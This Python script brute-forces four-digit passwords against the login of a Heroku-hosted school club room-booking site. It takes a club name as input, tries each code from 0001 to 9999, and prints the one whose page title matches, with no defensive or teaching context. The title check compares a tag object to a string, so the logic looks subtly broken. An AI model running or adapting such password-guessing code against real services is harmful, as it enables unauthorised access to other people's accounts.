from bs4 import BeautifulSoup
import requests
import urllib
import urllib.request as req
from urllib.parse import urljoin

def clubPassword(USER,PASS):    
    base_url = "https://polar-earth-61256.herokuapp.com/rooms/월"
    session = requests.session()
    login_info = {
        'id' : USER,
        'password' : PASS
    }
    url_login = 'https://polar-earth-61256.herokuapp.com/user_login'
    res = session.post(url_login, data=login_info)
    res.raise_for_status()
    res = session.get(base_url)
    res.raise_for_status()
    soup = BeautifulSoup(res.text, "html.parser")
    title = soup.find('title')
    if title == "<title>HAFS 직방 - 회화실 신청</title>" :
        return PASS
    else :
        return False
User = input("동아리를 입력하세요 : ")
for i in range(1,10000) :
    while len(str(i)) < 4 :
        i = '0'+str(i)
    password = clubPassword(User, i)
    if password : 
        print(password)
        break


